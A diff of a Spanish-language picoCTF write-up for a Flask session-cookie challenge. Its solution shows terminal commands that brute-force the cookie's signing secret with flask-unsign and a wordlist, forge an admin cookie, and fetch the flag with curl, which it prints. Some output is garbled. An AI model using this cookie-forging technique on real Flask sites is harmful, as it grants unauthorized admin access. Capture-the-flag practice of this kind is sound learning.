@@ -1,34 +1,36 @@
+## Descripción
+Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/c135543530f7dc24c3a6ecaeb44a81b8/server.py) [http://mercury.picoctf.net:65344/](http://mercury.picoctf.net:65344/)
+Hints:
+1. How secure is a flask cookie?
+## Solución 
 
+Visualizamos el archivo llamado server.py, donde podemos visualizar los nombres de las galletas con la que se firmo la galleta. Para saber cual de las galletas fue utilizada usamos la herramienta flask-unsign. Con ello, podemos crear otra galleta firmada correctamente para que ser admin y asi obtener la galleta
+~~~
+srriv@LAPTOP-7DDM83G8:~/SRSS/mostcookies$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z_7NCg.q-25vcdyPIAS8k-JJ3hnusDVCmg" --wordlist galletas.txt
 
-srriv@LAPTOP-7DDM83G8:~/SRSS/mostcookies$ pipx ensurepath
-Success! Added /home/srriv/.local/bin to the PATH environment variable.
+[*] Session decodes to: {'very_auth': 'snickerdoodle'}
+[*] Starting brute-forcer with 8 threads..
+[+] Found secret key after 28 attemptscadamia
+'fortune'
 
-Consider adding shell completions for pipx. Run 'pipx completions' for instructions.
+srriv@LAPTOP-7DDM83G8:~/SRSS/mostcookies$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "fortune"
 
-You will need to open a new terminal or re-login for the PATH changes to take effect.
+eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z_7QTw.FdBRxn9LQzZYjGkxLeaBif_DRdc
 
-Otherwise pipx is ready to go! ✨ 🌟 ✨
-srriv@LAPTOP-7DDM83G8:~/SRSS/mostcookies$ pipx install flask-unsign
-  installed package flask-unsign 1.2.1, installed using Python 3.12.3
-  These apps are now globally available
-    - flask-unsign
-⚠️  Note: '/home/srriv/.local/bin' is not on your PATH environment variable. These apps will not be globally accessible until your
-    PATH is updated. Run `pipx ensurepath` to automatically add it, or manually modify your PATH in your shell's config file (i.e.
-    ~/.bashrc).
-done! ✨ 🌟 ✨
-srriv@LAPTOP-7DDM83G8:~/SRSS/mostcookies$ echo "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z-7aXQ.KaGZCrkgomkQkbE2mKVDTQORrgQ" | base64 -d
-{"very_auth":"snickerdoodle"}base64: invalid input
-srriv@LAPTOP-7DDM83G8:~/SRSS/mostcookies$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z-7aXQ.KaGZCrkgomkQkbE2mKVDTQORrgQ" --wordlist galletas.txt
-flask-unsign: command not found
-srriv@LAPTOP-7DDM83G8:~/SRSS/mostcookies$ pipx ensurepath
-/home/srriv/.local/bin has been been added to PATH, but you need to open a new terminal or re-login for this PATH change to take
-    effect.
+srriv@LAPTOP-7DDM83G8:~/SRSS/mostcookies$ curl -s
 
-You will need to open a new terminal or re-login for the PATH changes to take effect.
+http://mercury.picoctf.net:65344/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z_7QTw.FdBRxn9LQzZYjGkxLeaBif_DRdc" | grep pico
 
-Otherwise pipx is ready to go! ✨ 🌟 ✨
-srriv@LAPTOP-7DDM83G8:~/SRSS/mostcookies$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z-7aXQ.KaGZCrkgomkQkbE2mKVDTQORrgQ" --wordlist galletas.txt
-flask-unsign: command not found
+            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{pwn_4ll_th3_cook1E5_25bdb6f6}</code></p>
+            
 srriv@LAPTOP-7DDM83G8:~/SRSS/mostcookies$
+~~~
 
-flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "fortune"
+~~~
+picoCTF{pwn_4ll_th3_cook1E5_25bdb6f6}
+~~~
+
+## Notas adicionales 
+## Referencias
+
+
